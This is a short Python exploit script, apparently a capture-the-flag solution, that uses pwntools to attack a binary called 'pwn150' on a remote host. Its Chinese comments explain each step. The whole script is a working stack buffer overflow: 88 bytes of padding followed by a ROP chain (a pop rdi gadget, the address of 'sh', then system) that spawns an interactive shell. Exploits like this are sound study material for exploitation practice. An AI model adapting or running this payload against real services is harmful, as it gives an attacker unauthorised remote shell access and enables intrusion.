#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)
io = remote('192.168.80.132', 30001)

elf = ELF('./pwn150')

binsh = 0x4003ef			#字符串"sh"在内存中的位置
pop_rdi = 0x400883			#pop rdi; retn
system_addr = p64(elf.symbols['system'])

payload = ""
payload += "A"*88			#padding
payload += p64(pop_rdi)
payload += p64(binsh)		#rdi指向字符串"sh"
payload += system_addr #跳转到system函数以执行system("/bin/sh")

io.sendline(payload)
io.interactive()
